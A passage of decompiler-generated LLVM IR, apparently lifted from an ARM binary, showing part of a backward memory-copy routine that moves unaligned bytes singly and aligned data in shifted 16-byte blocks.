  %v4_1b4e4 = inttoptr i32 %v3_1b4e4 to i8*
  store i8 %v3_1b4e0, i8* %v4_1b4e4, align 1
  %v5_1b4e4 = load i32, i32* %r0.global-to-local, align 4
  %v6_1b4e4 = add i32 %v5_1b4e4, -1
  store i32 %v6_1b4e4, i32* %r0.global-to-local, align 4
  %v0_1b4e8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1b4e8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1b4e8 = xor i1 %v0_1b4e8, %v1_1b4e8
  br i1 %v2_1b4e8, label %.thread128, label %bb152

bb152:                                            ; preds = %bb151
  %v3_1b4e8 = load i32, i32* %r1.global-to-local, align 4
  %v4_1b4e8 = add i32 %v3_1b4e8, -1
  %v5_1b4e8 = inttoptr i32 %v4_1b4e8 to i8*
  %v6_1b4e8 = load i8, i8* %v5_1b4e8, align 1
  %v7_1b4e8 = zext i8 %v6_1b4e8 to i32
  store i32 %v7_1b4e8, i32* @r3, align 4
  store i32 %v4_1b4e8, i32* %r1.global-to-local, align 4
  %v6_1b4ec = add i32 %v5_1b4e4, -2
  %v7_1b4ec = inttoptr i32 %v6_1b4ec to i8*
  store i8 %v6_1b4e8, i8* %v7_1b4ec, align 1
  %v8_1b4ec = load i32, i32* %r0.global-to-local, align 4
  %v9_1b4ec = add i32 %v8_1b4ec, -1
  store i32 %v9_1b4ec, i32* %r0.global-to-local, align 4
  %v1_1b4f0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1b4f0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread128

.thread128:                                       ; preds = %bb151, %bb152
  %v7_1b4f4 = phi i32 [ %v9_1b4ec, %bb152 ], [ %v6_1b4e4, %bb151 ]
  %v2_1b4f4 = phi i1 [ %v2_1b4f0.pre, %bb152 ], [ %v1_1b4e8, %bb151 ]
  %v1_1b4f4 = phi i1 [ %v1_1b4f0.pre, %bb152 ], [ %v0_1b4e8, %bb151 ]
  %v0_1b4f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1b4f0 = xor i1 %v2_1b4f4, %v1_1b4f4
  %v4_1b4f0 = or i1 %v0_1b4f0, %v3_1b4f0
  br i1 %v4_1b4f0, label %.thread129, label %bb153

bb153:                                            ; preds = %.thread128
  %v5_1b4f0 = load i32, i32* %r1.global-to-local, align 4
  %v6_1b4f0 = add i32 %v5_1b4f0, -1
  %v7_1b4f0 = inttoptr i32 %v6_1b4f0 to i8*
  %v8_1b4f0 = load i8, i8* %v7_1b4f0, align 1
  %v9_1b4f0 = zext i8 %v8_1b4f0 to i32
  store i32 %v9_1b4f0, i32* @r3, align 4
  store i32 %v6_1b4f0, i32* %r1.global-to-local, align 4
  %v8_1b4f4 = add i32 %v7_1b4f4, -1
  %v9_1b4f4 = inttoptr i32 %v8_1b4f4 to i8*
  store i8 %v8_1b4f0, i8* %v9_1b4f4, align 1
  %v10_1b4f4 = load i32, i32* %r0.global-to-local, align 4
  %v11_1b4f4 = add i32 %v10_1b4f4, -1
  store i32 %v11_1b4f4, i32* %r0.global-to-local, align 4
  br label %.thread129

dec_label_pc_1b4fc:                               ; preds = %dec_label_pc_1b454
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1b4fc = icmp eq i32 %v1_1b454, 1
  store i1 %v8_1b4fc, i1* %cpsr_n.global-to-local, align 1
  %v9_1b4fc = icmp eq i32 %v1_1b454, 2
  store i1 %v9_1b4fc, i1* %cpsr_z.global-to-local, align 1
  %v1_1b500 = add i32 %v2_1b444, -1
  %v2_1b500 = inttoptr i32 %v1_1b500 to i8*
  %v3_1b500 = load i8, i8* %v2_1b500, align 1
  %v4_1b500 = zext i8 %v3_1b500 to i32
  store i32 %v4_1b500, i32* @r3, align 4
  store i32 %v1_1b500, i32* %r1.global-to-local, align 4
  %v3_1b504 = add i32 %v2_1b448, -1
  %v4_1b504 = inttoptr i32 %v3_1b504 to i8*
  store i8 %v3_1b500, i8* %v4_1b504, align 1
  %v5_1b504 = load i32, i32* %r0.global-to-local, align 4
  %v6_1b504 = add i32 %v5_1b504, -1
  store i32 %v6_1b504, i32* %r0.global-to-local, align 4
  br i1 %v8_1b4fc, label %.thread13, label %bb154

bb154:                                            ; preds = %dec_label_pc_1b4fc
  %v6_1b508 = load i32, i32* %r1.global-to-local, align 4
  %v7_1b508 = add i32 %v6_1b508, -1
  %v8_1b508 = inttoptr i32 %v7_1b508 to i8*
  %v9_1b508 = load i8, i8* %v8_1b508, align 1
  %v10_1b508 = zext i8 %v9_1b508 to i32
  store i32 %v10_1b508, i32* @r3, align 4
  store i32 %v7_1b508, i32* %r1.global-to-local, align 4
  %v9_1b50c = add i32 %v5_1b504, -2
  %v10_1b50c = inttoptr i32 %v9_1b50c to i8*
  store i8 %v9_1b508, i8* %v10_1b50c, align 1
  %v11_1b50c = load i32, i32* %r0.global-to-local, align 4
  %v12_1b50c = add i32 %v11_1b50c, -1
  store i32 %v12_1b50c, i32* %r0.global-to-local, align 4
  br i1 %v9_1b4fc, label %.thread13, label %bb155

bb155:                                            ; preds = %bb154
  %v8_1b510 = load i32, i32* %r1.global-to-local, align 4
  %v9_1b510 = add i32 %v8_1b510, -1
  %v10_1b510 = inttoptr i32 %v9_1b510 to i8*
  %v11_1b510 = load i8, i8* %v10_1b510, align 1
  %v12_1b510 = zext i8 %v11_1b510 to i32
  store i32 %v12_1b510, i32* @r3, align 4
  store i32 %v9_1b510, i32* %r1.global-to-local, align 4
  %v11_1b514 = add i32 %v11_1b50c, -2
  %v12_1b514 = inttoptr i32 %v11_1b514 to i8*
  store i8 %v11_1b510, i8* %v12_1b514, align 1
  %v13_1b514 = load i32, i32* %r0.global-to-local, align 4
  %v14_1b514 = add i32 %v13_1b514, -1
  store i32 %v14_1b514, i32* %r0.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb154, %dec_label_pc_1b4fc, %bb155
  %v0_1b57019 = phi i32 [ %v12_1b50c, %bb154 ], [ %v6_1b504, %dec_label_pc_1b4fc ], [ %v14_1b514, %bb155 ]
  %v0_1b518 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b518 = load i32, i32* @ip, align 4
  %v2_1b518 = sub i32 %v0_1b518, %v1_1b518
  store i32 %v2_1b518, i32* %r2.global-to-local, align 4
  %v4_1b518 = xor i32 %v1_1b518, %v0_1b518
  %v5_1b518 = xor i32 %v2_1b518, %v0_1b518
  %v6_1b518 = and i32 %v5_1b518, %v4_1b518
  %v7_1b518 = icmp slt i32 %v6_1b518, 0
  store i1 %v7_1b518, i1* %cpsr_v.global-to-local, align 1
  %v8_1b518 = icmp slt i32 %v2_1b518, 0
  store i1 %v8_1b518, i1* %cpsr_n.global-to-local, align 1
  %v9_1b518 = icmp eq i32 %v0_1b518, %v1_1b518
  store i1 %v9_1b518, i1* %cpsr_z.global-to-local, align 1
  %v5_1b51c = icmp slt i32 %v0_1b518, %v1_1b518
  br i1 %v5_1b51c, label %bb150, label %dec_label_pc_1b520

dec_label_pc_1b520:                               ; preds = %.thread13
  %v0_1b520 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b520 = urem i32 %v0_1b520, 4
  store i32 %v1_1b520, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1b520 = icmp eq i32 %v1_1b520, 0
  store i1 %v2_1b520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b520, label %dec_label_pc_1b464, label %dec_label_pc_1b528

dec_label_pc_1b528:                               ; preds = %dec_label_pc_1b45c, %dec_label_pc_1b520
  %v0_1b57018 = phi i32 [ %v2_1b448, %dec_label_pc_1b45c ], [ %v0_1b57019, %dec_label_pc_1b520 ]
  %v0_1b61c = phi i32 [ %v2_1b44c, %dec_label_pc_1b45c ], [ %v2_1b518, %dec_label_pc_1b520 ]
  %v0_1b528 = phi i32 [ %v2_1b444, %dec_label_pc_1b45c ], [ %v0_1b520, %dec_label_pc_1b520 ]
  %v0_1b530 = phi i32 [ %v1_1b45c, %dec_label_pc_1b45c ], [ %v1_1b520, %dec_label_pc_1b520 ]
  %v1_1b528 = and i32 %v0_1b528, -4
  store i32 %v1_1b528, i32* %r1.global-to-local, align 4
  %v1_1b52c = inttoptr i32 %v1_1b528 to i32*
  %v2_1b52c = load i32, i32* %v1_1b52c, align 4
  store i32 %v2_1b52c, i32* @r3, align 4
  %v7_1b530 = icmp ult i32 %v0_1b530, 2
  %v2_1b614 = add i32 %v0_1b61c, -12
  %v4_1b614 = sub i32 11, %v0_1b61c
  %v5_1b614 = and i32 %v4_1b614, %v0_1b61c
  %v6_1b614 = icmp slt i32 %v5_1b614, 0
  store i1 %v6_1b614, i1* %cpsr_v.global-to-local, align 1
  %v7_1b614 = icmp slt i32 %v2_1b614, 0
  store i1 %v7_1b614, i1* %cpsr_n.global-to-local, align 1
  %v8_1b614 = icmp eq i32 %v0_1b61c, 12
  store i1 %v8_1b614, i1* %cpsr_z.global-to-local, align 1
  %v5_1b618 = icmp slt i32 %v0_1b61c, 12
  br i1 %v7_1b530, label %dec_label_pc_1b614, label %dec_label_pc_1b538

dec_label_pc_1b538:                               ; preds = %dec_label_pc_1b528
  %v8_1b530 = icmp eq i32 %v0_1b530, 2
  br i1 %v8_1b530, label %dec_label_pc_1b5a8, label %dec_label_pc_1b53c

dec_label_pc_1b53c:                               ; preds = %dec_label_pc_1b538
  br i1 %v5_1b618, label %dec_label_pc_1b588, label %dec_label_pc_1b544

dec_label_pc_1b544:                               ; preds = %dec_label_pc_1b53c
  store i32 %v2_1b614, i32* %r2.global-to-local, align 4
  %v3_1b548 = load i32, i32* @r4, align 4
  store i32 %v3_1b548, i32* %stack_var_-12, align 4
  %v6_1b548 = load i32, i32* @r5, align 4
  %v8_1b548 = inttoptr i32 %v6_1b548 to i8*
  store i8* %v8_1b548, i8** %stack_var_-8, align 4
  %v11_1b548 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1b54c

dec_label_pc_1b54c:                               ; preds = %dec_label_pc_1b54c.dec_label_pc_1b54c_crit_edge, %dec_label_pc_1b544
  %v0_1b570 = phi i32 [ %v1_1b570, %dec_label_pc_1b54c.dec_label_pc_1b54c_crit_edge ], [ %v0_1b57018, %dec_label_pc_1b544 ]
  %v0_1b550 = phi i32 [ %v0_1b550.pre, %dec_label_pc_1b54c.dec_label_pc_1b54c_crit_edge ], [ %v1_1b528, %dec_label_pc_1b544 ]
  %v0_1b54c = phi i32 [ %v0_1b54c.pre, %dec_label_pc_1b54c.dec_label_pc_1b54c_crit_edge ], [ %v2_1b52c, %dec_label_pc_1b544 ]
  %v3_1b54c = mul i32 %v0_1b54c, 256
  store i32 %v3_1b54c, i32* %lr.global-to-local, align 4
  %v1_1b550 = add i32 %v0_1b550, -4
  %v2_1b550 = inttoptr i32 %v1_1b550 to i32*
  %v3_1b550 = load i32, i32* %v2_1b550, align 4
  store i32 %v3_1b550, i32* @r3, align 4
  %v4_1b550 = add i32 %v0_1b550, -8
  %v5_1b550 = inttoptr i32 %v4_1b550 to i32*
  %v6_1b550 = load i32, i32* %v5_1b550, align 4
  store i32 %v6_1b550, i32* %r4.global-to-local, align 4
  %v7_1b550 = add i32 %v0_1b550, -12
  %v8_1b550 = inttoptr i32 %v7_1b550 to i32*
  %v9_1b550 = load i32, i32* %v8_1b550, align 4
  store i32 %v9_1b550, i32* %r5.global-to-local, align 4
  %v10_1b550 = add i32 %v0_1b550, -16
  %v11_1b550 = inttoptr i32 %v10_1b550 to i32*
  %v12_1b550 = load i32, i32* %v11_1b550, align 4
  store i32 %v10_1b550, i32* %r1.global-to-local, align 4
  %v4_1b554 = udiv i32 %v12_1b550, 16777216
  %v5_1b554 = or i32 %v4_1b554, %v3_1b54c
  store i32 %v5_1b554, i32* %lr.global-to-local, align 4
  %v3_1b558 = mul i32 %v12_1b550, 256
  %v4_1b55c = udiv i32 %v9_1b550, 16777216
  %v5_1b55c = or i32 %v3_1b558, %v4_1b55c
  store i32 %v5_1b55c, i32* @ip, align 4
  %v3_1b560 = mul i32 %v9_1b550, 256
  %v4_1b564 = udiv i32 %v6_1b550, 16777216
  %v5_1b564 = or i32 %v3_1b560, %v4_1b564
  store i32 %v5_1b564, i32* %r5.global-to-local, align 4
  %v3_1b568 = mul i32 %v6_1b550, 256
  %v4_1b56c = udiv i32 %v3_1b550, 16777216
  %v5_1b56c = or i32 %v3_1b568, %v4_1b56c
  store i32 %v5_1b56c, i32* %r4.global-to-local, align 4
  %v1_1b570 = add i32 %v0_1b570, -16
  %v2_1b570 = inttoptr i32 %v1_1b570 to i32*
  store i32 %v5_1b56c, i32* %v2_1b570, align 4
  %v4_1b570 = add i32 %v0_1b570, -12
  %v5_1b570 = inttoptr i32 %v4_1b570 to i32*
  %v6_1b570 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1b570, i32* %v5_1b570, align 4
  %v7_1b570 = add i32 %v0_1b570, -8
  %v8_1b570 = inttoptr i32 %v7_1b570 to i32*
  %v9_1b570 = load i32, i32* @ip, align 4
  store i32 %v9_1b570, i32* %v8_1b570, align 4
  %v10_1b570 = add i32 %v0_1b570, -4
  %v11_1b570 = inttoptr i32 %v10_1b570 to i32*
  %v12_1b570 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1b570, i32* %v11_1b570, align 4
  store i32 %v1_1b570, i32* %r0.global-to-local, align 4
  %v0_1b574 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b574 = add i32 %v0_1b574, -16
  store i32 %v2_1b574, i32* %r2.global-to-local, align 4
  %v6_1b578 = icmp slt i32 %v0_1b574, 16
  br i1 %v6_1b578, label %dec_label_pc_1b57c, label %dec_label_pc_1b54c.dec_label_pc_1b54c_crit_edge

dec_label_pc_1b54c.dec_label_pc_1b54c_crit_edge:  ; preds = %dec_label_pc_1b54c
  %v0_1b54c.pre = load i32, i32* @r3, align 4
  %v0_1b550.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b54c

dec_label_pc_1b57c:                               ; preds = %dec_label_pc_1b54c
  %v2_1b57c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b57c, i32* @r4, align 4
  %v5_1b57c = load i8*, i8** %stack_var_-8, align 4
  %v6_1b57c = ptrtoint i8* %v5_1b57c to i32
  store i32 %v6_1b57c, i32* @r5, align 4
  store i32 %v11_1b548, i32* @lr, align 4
  %v2_1b580 = add i32 %v0_1b574, -4
  store i32 %v2_1b580, i32* %r2.global-to-local, align 4
  %v4_1b580 = add i32 %v0_1b574, 2147483632
  %v5_1b580 = and i32 %v2_1b580, %v4_1b580
  %v6_1b580 = icmp slt i32 %v5_1b580, 0
  store i1 %v6_1b580, i1* %cpsr_v.global-to-local, align 1
  %v7_1b580 = icmp slt i32 %v2_1b580, 0
  store i1 %v7_1b580, i1* %cpsr_n.global-to-local, align 1
  %v8_1b580 = icmp eq i32 %v2_1b580, 0
  store i1 %v8_1b580, i1* %cpsr_z.global-to-local, align 1
  %v5_1b584 = icmp slt i32 %v2_1b574, -12
  br i1 %v5_1b584, label %dec_label_pc_1b5a0, label %dec_label_pc_1b588

dec_label_pc_1b588:                               ; preds = %dec_label_pc_1b57c, %dec_label_pc_1b53c, %dec_label_pc_1b588
  %v1_1b594 = phi i32 [ %v5_1b594, %dec_label_pc_1b588 ], [ %v1_1b570, %dec_label_pc_1b57c ], [ %v0_1b57018, %dec_label_pc_1b53c ]
  %v0_1b588 = load i32, i32* @r3, align 4
  %v3_1b588 = mul i32 %v0_1b588, 256
  store i32 %v3_1b588, i32* %ip.global-to-local, align 4
  %v0_1b58c = load i32, i32* %r1.global-to-local, align 4
  %v1_1b58c = add i32 %v0_1b58c, -4
  %v2_1b58c = inttoptr i32 %v1_1b58c to i32*
  %v3_1b58c = load i32, i32* %v2_1b58c, align 4
  store i32 %v3_1b58c, i32* @r3, align 4
  store i32 %v1_1b58c, i32* %r1.global-to-local, align 4
  %v4_1b590 = udiv i32 %v3_1b58c, 16777216
  %v5_1b590 = or i32 %v4_1b590, %v3_1b588
  store i32 %v5_1b590, i32* @ip, align 4
  %v2_1b594 = add i32 %v1_1b594, -4
  %v3_1b594 = inttoptr i32 %v2_1b594 to i32*
  store i32 %v5_1b590, i32* %v3_1b594, align 4
  %v4_1b594 = load i32, i32* %r0.global-to-local, align 4
  %v5_1b594 = add i32 %v4_1b594, -4
  store i32 %v5_1b594, i32* %r0.global-to-local, align 4
  %v0_1b598 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b598 = add i32 %v0_1b598, -4
  store i32 %v2_1b598, i32* %r2.global-to-local, align 4
  %v6_1b59c = icmp slt i32 %v0_1b598, 4
  br i1 %v6_1b59c, label %dec_label_pc_1b5a0.loopexit, label %dec_label_pc_1b588

dec_label_pc_1b5a0.loopexit:                      ; preds = %dec_label_pc_1b588
  %v4_1b598 = sub i32 3, %v0_1b598
  %v5_1b598 = and i32 %v4_1b598, %v0_1b598
  %v6_1b598 = icmp slt i32 %v5_1b598, 0
  %v7_1b598 = icmp slt i32 %v2_1b598, 0
  store i1 %v6_1b598, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1b598, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b5a0

dec_label_pc_1b5a0:                               ; preds = %dec_label_pc_1b5a0.loopexit, %dec_label_pc_1b57c
  %v2_1b4e450 = phi i32 [ %v5_1b594, %dec_label_pc_1b5a0.loopexit ], [ %v1_1b570, %dec_label_pc_1b57c ]
  %v0_1b4d446 = phi i32 [ %v2_1b598, %dec_label_pc_1b5a0.loopexit ], [ %v2_1b580, %dec_label_pc_1b57c ]
  %v0_1b5a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b5a0 = add i32 %v0_1b5a0, 3
  store i32 %v1_1b5a0, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_1b5a8:                               ; preds = %dec_label_pc_1b538
  br i1 %v5_1b618, label %dec_label_pc_1b5f4, label %dec_label_pc_1b5b0

dec_label_pc_1b5b0:                               ; preds = %dec_label_pc_1b5a8
  store i32 %v2_1b614, i32* %r2.global-to-local, align 4
  %v3_1b5b4 = load i32, i32* @r4, align 4
  store i32 %v3_1b5b4, i32* %stack_var_-12, align 4
  %v6_1b5b4 = load i32, i32* @r5, align 4
  %v8_1b5b4 = inttoptr i32 %v6_1b5b4 to i8*
  store i8* %v8_1b5b4, i8** %stack_var_-8, align 4
  %v11_1b5b4 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1b5b8

dec_label_pc_1b5b8:                               ; preds = %dec_label_pc_1b5b8.dec_label_pc_1b5b8_crit_edge, %dec_label_pc_1b5b0
  %v0_1b5dc = phi i32 [ %v1_1b5dc, %dec_label_pc_1b5b8.dec_label_pc_1b5b8_crit_edge ], [ %v0_1b57018, %dec_label_pc_1b5b0 ]
  %v0_1b5bc = phi i32 [ %v0_1b5bc.pre, %dec_label_pc_1b5b8.dec_label_pc_1b5b8_crit_edge ], [ %v1_1b528, %dec_label_pc_1b5b0 ]
  %v0_1b5b8 = phi i32 [ %v0_1b5b8.pre, %dec_label_pc_1b5b8.dec_label_pc_1b5b8_crit_edge ], [ %v2_1b52c, %dec_label_pc_1b5b0 ]
  %v3_1b5b8 = mul i32 %v0_1b5b8, 65536
  store i32 %v3_1b5b8, i32* %lr.global-to-local, align 4
  %v1_1b5bc = add i32 %v0_1b5bc, -4
  %v2_1b5bc = inttoptr i32 %v1_1b5bc to i32*
  %v3_1b5bc = load i32, i32* %v2_1b5bc, align 4
  store i32 %v3_1b5bc, i32* @r3, align 4
  %v4_1b5bc = add i32 %v0_1b5bc, -8
  %v5_1b5bc = inttoptr i32 %v4_1b5bc to i32*
  %v6_1b5bc = load i32, i32* %v5_1b5bc, align 4
  store i32 %v6_1b5bc, i32* %r4.global-to-local, align 4
  %v7_1b5bc = add i32 %v0_1b5bc, -12
  %v8_1b5bc = inttoptr i32 %v7_1b5bc to i32*
  %v9_1b5bc = load i32, i32* %v8_1b5bc, align 4
  store i32 %v9_1b5bc, i32* %r5.global-to-local, align 4
  %v10_1b5bc = add i32 %v0_1b5bc, -16
  %v11_1b5bc = inttoptr i32 %v10_1b5bc to i32*
  %v12_1b5bc = load i32, i32* %v11_1b5bc, align 4
  store i32 %v10_1b5bc, i32* %r1.global-to-local, align 4
  %v4_1b5c0 = udiv i32 %v12_1b5bc, 65536
  %v5_1b5c0 = or i32 %v4_1b5c0, %v3_1b5b8
  store i32 %v5_1b5c0, i32* %lr.global-to-local, align 4
  %v3_1b5c4 = mul i32 %v12_1b5bc, 65536
  %v4_1b5c8 = udiv i32 %v9_1b5bc, 65536
  %v5_1b5c8 = or i32 %v3_1b5c4, %v4_1b5c8
  store i32 %v5_1b5c8, i32* @ip, align 4
  %v3_1b5cc = mul i32 %v9_1b5bc, 65536
  %v4_1b5d0 = udiv i32 %v6_1b5bc, 65536
  %v5_1b5d0 = or i32 %v3_1b5cc, %v4_1b5d0
  store i32 %v5_1b5d0, i32* %r5.global-to-local, align 4
  %v3_1b5d4 = mul i32 %v6_1b5bc, 65536
  %v4_1b5d8 = udiv i32 %v3_1b5bc, 65536
  %v5_1b5d8 = or i32 %v3_1b5d4, %v4_1b5d8
  store i32 %v5_1b5d8, i32* %r4.global-to-local, align 4
  %v1_1b5dc = add i32 %v0_1b5dc, -16
  %v2_1b5dc = inttoptr i32 %v1_1b5dc to i32*
  store i32 %v5_1b5d8, i32* %v2_1b5dc, align 4
  %v4_1b5dc = add i32 %v0_1b5dc, -12
  %v5_1b5dc = inttoptr i32 %v4_1b5dc to i32*
  %v6_1b5dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1b5dc, i32* %v5_1b5dc, align 4
  %v7_1b5dc = add i32 %v0_1b5dc, -8
  %v8_1b5dc = inttoptr i32 %v7_1b5dc to i32*
  %v9_1b5dc = load i32, i32* @ip, align 4
  store i32 %v9_1b5dc, i32* %v8_1b5dc, align 4
  %v10_1b5dc = add i32 %v0_1b5dc, -4
  %v11_1b5dc = inttoptr i32 %v10_1b5dc to i32*
  %v12_1b5dc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1b5dc, i32* %v11_1b5dc, align 4
  store i32 %v1_1b5dc, i32* %r0.global-to-local, align 4
  %v0_1b5e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b5e0 = add i32 %v0_1b5e0, -16
  store i32 %v2_1b5e0, i32* %r2.global-to-local, align 4
  %v6_1b5e4 = icmp slt i32 %v0_1b5e0, 16
  br i1 %v6_1b5e4, label %dec_label_pc_1b5e8, label %dec_label_pc_1b5b8.dec_label_pc_1b5b8_crit_edge

dec_label_pc_1b5b8.dec_label_pc_1b5b8_crit_edge:  ; preds = %dec_label_pc_1b5b8
  %v0_1b5b8.pre = load i32, i32* @r3, align 4
  %v0_1b5bc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b5b8

dec_label_pc_1b5e8:                               ; preds = %dec_label_pc_1b5b8
  %v2_1b5e8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b5e8, i32* @r4, align 4
  %v5_1b5e8 = load i8*, i8** %stack_var_-8, align 4
  %v6_1b5e8 = ptrtoint i8* %v5_1b5e8 to i32
  store i32 %v6_1b5e8, i32* @r5, align 4
  store i32 %v11_1b5b4, i32* @lr, align 4
  %v2_1b5ec = add i32 %v0_1b5e0, -4
  store i32 %v2_1b5ec, i32* %r2.global-to-local, align 4
  %v4_1b5ec = add i32 %v0_1b5e0, 2147483632
  %v5_1b5ec = and i32 %v2_1b5ec, %v4_1b5ec
  %v6_1b5ec = icmp slt i32 %v5_1b5ec, 0
  store i1 %v6_1b5ec, i1* %cpsr_v.global-to-local, align 1
  %v7_1b5ec = icmp slt i32 %v2_1b5ec, 0
  store i1 %v7_1b5ec, i1* %cpsr_n.global-to-local, align 1
  %v8_1b5ec = icmp eq i32 %v2_1b5ec, 0
  store i1 %v8_1b5ec, i1* %cpsr_z.global-to-local, align 1
  %v5_1b5f0 = icmp slt i32 %v2_1b5e0, -12
  br i1 %v5_1b5f0, label %dec_label_pc_1b60c, label %dec_label_pc_1b5f4

dec_label_pc_1b5f4:                               ; preds = %dec_label_pc_1b5e8, %dec_label_pc_1b5a8, %dec_label_pc_1b5f4
  %v1_1b600 = phi i32 [ %v5_1b600, %dec_label_pc_1b5f4 ], [ %v1_1b5dc, %dec_label_pc_1b5e8 ], [ %v0_1b57018, %dec_label_pc_1b5a8 ]
  %v0_1b5f4 = load i32, i32* @r3, align 4
  %v3_1b5f4 = mul i32 %v0_1b5f4, 65536
  store i32 %v3_1b5f4, i32* %ip.global-to-local, align 4
  %v0_1b5f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b5f8 = add i32 %v0_1b5f8, -4
  %v2_1b5f8 = inttoptr i32 %v1_1b5f8 to i32*
  %v3_1b5f8 = load i32, i32* %v2_1b5f8, align 4
  store i32 %v3_1b5f8, i32* @r3, align 4
  store i32 %v1_1b5f8, i32* %r1.global-to-local, align 4
  %v4_1b5fc = udiv i32 %v3_1b5f8, 65536
  %v5_1b5fc = or i32 %v4_1b5fc, %v3_1b5f4
  store i32 %v5_1b5fc, i32* @ip, align 4
  %v2_1b600 = add i32 %v1_1b600, -4
  %v3_1b600 = inttoptr i32 %v2_1b600 to i32*
  store i32 %v5_1b5fc, i32* %v3_1b600, align 4
  %v4_1b600 = load i32, i32* %r0.global-to-local, align 4
  %v5_1b600 = add i32 %v4_1b600, -4
  store i32 %v5_1b600, i32* %r0.global-to-local, align 4
  %v0_1b604 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b604 = add i32 %v0_1b604, -4
  store i32 %v2_1b604, i32* %r2.global-to-local, align 4
  %v6_1b608 = icmp slt i32 %v0_1b604, 4
  br i1 %v6_1b608, label %dec_label_pc_1b60c.loopexit, label %dec_label_pc_1b5f4

dec_label_pc_1b60c.loopexit:                      ; preds = %dec_label_pc_1b5f4
  %v4_1b604 = sub i32 3, %v0_1b604
  %v5_1b604 = and i32 %v4_1b604, %v0_1b604
  %v6_1b604 = icmp slt i32 %v5_1b604, 0
  %v7_1b604 = icmp slt i32 %v2_1b604, 0
  store i1 %v6_1b604, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1b604, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b60c

dec_label_pc_1b60c:                               ; preds = %dec_label_pc_1b60c.loopexit, %dec_label_pc_1b5e8
  %v2_1b4e451 = phi i32 [ %v5_1b600, %dec_label_pc_1b60c.loopexit ], [ %v1_1b5dc, %dec_label_pc_1b5e8 ]
  %v0_1b4d447 = phi i32 [ %v2_1b604, %dec_label_pc_1b60c.loopexit ], [ %v2_1b5ec, %dec_label_pc_1b5e8 ]
  %v0_1b60c = load i32, i32* %r1.global-to-local, align 4
  %v1_1b60c = add i32 %v0_1b60c, 2
  store i32 %v1_1b60c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_1b614:                               ; preds = %dec_label_pc_1b528
  br i1 %v5_1b618, label %dec_label_pc_1b660, label %dec_label_pc_1b61c

dec_label_pc_1b61c:                               ; preds = %dec_label_pc_1b614
  store i32 %v2_1b614, i32* %r2.global-to-local, align 4
  %v3_1b620 = load i32, i32* @r4, align 4
  store i32 %v3_1b620, i32* %stack_var_-12, align 4
  %v6_1b620 = load i32, i32* @r5, align 4
  %v8_1b620 = inttoptr i32 %v6_1b620 to i8*
  store i8* %v8_1b620, i8** %stack_var_-8, align 4
  %v11_1b620 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1b624

dec_label_pc_1b624:                               ; preds = %dec_label_pc_1b624.dec_label_pc_1b624_crit_edge, %dec_label_pc_1b61c
  %v0_1b648 = phi i32 [ %v1_1b648, %dec_label_pc_1b624.dec_label_pc_1b624_crit_edge ], [ %v0_1b57018, %dec_label_pc_1b61c ]
  %v0_1b628 = phi i32 [ %v0_1b628.pre, %dec_label_pc_1b624.dec_label_pc_1b624_crit_edge ], [ %v1_1b528, %dec_label_pc_1b61c ]
  %v0_1b624 = phi i32 [ %v0_1b624.pre, %dec_label_pc_1b624.dec_label_pc_1b624_crit_edge ], [ %v2_1b52c, %dec_label_pc_1b61c ]
  %v3_1b624 = mul i32 %v0_1b624, 16777216
  store i32 %v3_1b624, i32* %lr.global-to-local, align 4
  %v1_1b628 = add i32 %v0_1b628, -4
  %v2_1b628 = inttoptr i32 %v1_1b628 to i32*
  %v3_1b628 = load i32, i32* %v2_1b628, align 4
  store i32 %v3_1b628, i32* @r3, align 4
  %v4_1b628 = add i32 %v0_1b628, -8
  %v5_1b628 = inttoptr i32 %v4_1b628 to i32*
  %v6_1b628 = load i32, i32* %v5_1b628, align 4
  store i32 %v6_1b628, i32* %r4.global-to-local, align 4
  %v7_1b628 = add i32 %v0_1b628, -12
  %v8_1b628 = inttoptr i32 %v7_1b628 to i32*
  %v9_1b628 = load i32, i32* %v8_1b628, align 4
  store i32 %v9_1b628, i32* %r5.global-to-local, align 4
  %v10_1b628 = add i32 %v0_1b628, -16
  %v11_1b628 = inttoptr i32 %v10_1b628 to i32*
  %v12_1b628 = load i32, i32* %v11_1b628, align 4
  store i32 %v10_1b628, i32* %r1.global-to-local, align 4
  %v4_1b62c = udiv i32 %v12_1b628, 256
  %v5_1b62c = or i32 %v4_1b62c, %v3_1b624
  store i32 %v5_1b62c, i32* %lr.global-to-local, align 4
  %v3_1b630 = mul i32 %v12_1b628, 16777216
  %v4_1b634 = udiv i32 %v9_1b628, 256
  %v5_1b634 = or i32 %v3_1b630, %v4_1b634
